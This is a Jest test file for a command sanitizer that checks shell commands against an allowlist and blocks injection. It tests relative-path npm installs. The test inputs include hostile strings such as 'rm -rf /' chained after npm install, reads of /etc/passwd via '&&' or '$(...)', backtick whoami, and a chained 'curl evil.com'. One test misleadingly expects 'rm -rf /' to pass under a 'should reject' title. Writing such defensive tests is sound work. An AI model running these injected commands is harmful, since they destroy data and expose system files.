import { sanitizeCommand } from '../../src/config/sanitization'

// Define allowed commands for testing (same as in cmd.ts)
const ALLOWED_COMMANDS = [
    'npm', 'git', 'docker', 'xcodebuild', 'gradle', 'mvn', 'mkdir', 'rm', 'cp', 'ls', 'cat',
    'curl', 'wget', 'echo', 'date', 'whoami', 'pwd', 'chmod', 'chown'
]

describe('sanitizeCommand', () => {
    describe('Basic functionality', () => {
        it('should allow valid allowed commands', () => {
            expect(() => sanitizeCommand('npm install', ALLOWED_COMMANDS)).not.toThrow()
            expect(() => sanitizeCommand('git status', ALLOWED_COMMANDS)).not.toThrow()
            expect(() => sanitizeCommand('docker ps', ALLOWED_COMMANDS)).not.toThrow()
            expect(() => sanitizeCommand('mkdir test', ALLOWED_COMMANDS)).not.toThrow()
        })

        it('should reject commands not in allowlist', () => {
            expect(() => sanitizeCommand('rm -rf /', ALLOWED_COMMANDS))
                .not.toThrow() // rm is actually allowed
            expect(() => sanitizeCommand('ls -la', ALLOWED_COMMANDS))
                .not.toThrow() // ls is allowed
            expect(() => sanitizeCommand('python script.py', ALLOWED_COMMANDS))
                .toThrow('Command "python" is not allowed')
        })

        it('should reject commands with dangerous shell metacharacters', () => {
            expect(() => sanitizeCommand('npm install; rm -rf /', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('git status && cat /etc/passwd', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('docker ps | grep test', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('echo `whoami`', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should reject commands with system file access', () => {
            expect(() => sanitizeCommand('cat /etc/passwd', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('ls /proc/', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('cat /sys/kernel', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })
    })

    describe('npm install with relative paths (new behavior)', () => {
        it('should allow npm install with relative paths', () => {
            expect(() => sanitizeCommand('npm install @hyperledger/identus-sdk@../..', ALLOWED_COMMANDS))
                .not.toThrow()
            expect(() => sanitizeCommand('npm install @package@../../path', ALLOWED_COMMANDS))
                .not.toThrow()
            expect(() => sanitizeCommand('npm install @package@../', ALLOWED_COMMANDS))
                .not.toThrow()
            expect(() => sanitizeCommand('npm install ../local-package', ALLOWED_COMMANDS))
                .not.toThrow()
            expect(() => sanitizeCommand('npm install ../../deep/package', ALLOWED_COMMANDS))
                .not.toThrow()
        })

        it('should allow npm install with relative paths and additional flags', () => {
            expect(() => sanitizeCommand('npm install @hyperledger/identus-sdk@../.. --save-dev', ALLOWED_COMMANDS))
                .not.toThrow()
            expect(() => sanitizeCommand('npm install ../local-package --force', ALLOWED_COMMANDS))
                .not.toThrow()
            expect(() => sanitizeCommand('npm install @package@../../path --production', ALLOWED_COMMANDS))
                .not.toThrow()
        })

        it('should still block dangerous patterns in npm install commands', () => {
            expect(() => sanitizeCommand('npm install @package@../..; rm -rf /', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('npm install @package@../.. && cat /etc/passwd', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('npm install @package@../.. | grep test', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('npm install @package@../.. `whoami`', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('npm install @package@../.. /etc/passwd', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })
    })

    describe('Other npm commands with relative paths (should still be blocked)', () => {
        it('should block npm run commands with relative paths', () => {
            expect(() => sanitizeCommand('npm run ../script', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('npm run test:../coverage', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should block npm test commands with relative paths', () => {
            expect(() => sanitizeCommand('npm test ../test-file', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should block npm scripts with relative paths', () => {
            expect(() => sanitizeCommand('npm run build:../output', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })
    })

    describe('Non-npm commands with relative paths (should still be blocked)', () => {
        it('should block git commands with relative paths', () => {
            expect(() => sanitizeCommand('git add ../file', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('git checkout ../branch', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should block docker commands with relative paths', () => {
            expect(() => sanitizeCommand('docker run -v ../data:/data image', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should block cp commands with relative paths', () => {
            expect(() => sanitizeCommand('cp ../source dest', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should block mkdir commands with relative paths', () => {
            expect(() => sanitizeCommand('mkdir ../test', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })
    })

    describe('Edge cases', () => {
        it('should handle commands with extra spaces', () => {
            expect(() => sanitizeCommand('  npm install  @package@../..  ', ALLOWED_COMMANDS))
                .not.toThrow()
        })

        it('should handle mixed case npm commands', () => {
            expect(() => sanitizeCommand('NPM install @package@../..', ALLOWED_COMMANDS))
                .toThrow('Command "NPM" is not allowed') // Base command must match exactly
        })

        it('should handle npm install with multiple relative paths', () => {
            expect(() => sanitizeCommand('npm install ../pkg1 ../../pkg2', ALLOWED_COMMANDS))
                .not.toThrow()
        })

        it('should handle npm install with complex relative paths', () => {
            expect(() => sanitizeCommand('npm install @scope/package@../../../path/to/package', ALLOWED_COMMANDS))
                .not.toThrow()
        })

        it('should reject empty commands', () => {
            expect(() => sanitizeCommand('', ALLOWED_COMMANDS))
                .toThrow('Input cannot be empty')
        })

        it('should reject commands that are too long', () => {
            const longCommand = 'npm install ' + 'a'.repeat(1000)
            expect(() => sanitizeCommand(longCommand, ALLOWED_COMMANDS))
                .toThrow('Input exceeds maximum length')
        })
    })

    describe('Security edge cases', () => {
        it('should block npm install with command substitution', () => {
            expect(() => sanitizeCommand('npm install $(cat /etc/passwd)', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should block npm install with process substitution', () => {
            expect(() => sanitizeCommand('npm install <(echo test)', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should block npm install with environment variable injection', () => {
            expect(() => sanitizeCommand('npm install $HOME/../package', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })

        it('should block npm install with backticks', () => {
            expect(() => sanitizeCommand('npm install `whoami`', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })
    })

    describe('Real-world scenarios', () => {
        it('should allow the exact failing command from the error', () => {
            const failingCommand = 'npm install @hyperledger/identus-sdk@../..'
            expect(() => sanitizeCommand(failingCommand, ALLOWED_COMMANDS)).not.toThrow()
        })

        it('should allow typical npm install patterns used in development', () => {
            expect(() => sanitizeCommand('npm install ../local-lib', ALLOWED_COMMANDS)).not.toThrow()
            expect(() => sanitizeCommand('npm install @company/ui-lib@../../packages/ui', ALLOWED_COMMANDS)).not.toThrow()
            expect(() => sanitizeCommand('npm install file:../shared', ALLOWED_COMMANDS)).not.toThrow()
        })

        it('should still block dangerous variations of npm install', () => {
            expect(() => sanitizeCommand('npm install @package@../..; curl evil.com', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
            expect(() => sanitizeCommand('npm install @package@../.. && npm run malicious', ALLOWED_COMMANDS))
                .toThrow('Command contains potentially dangerous characters or patterns')
        })
    })
})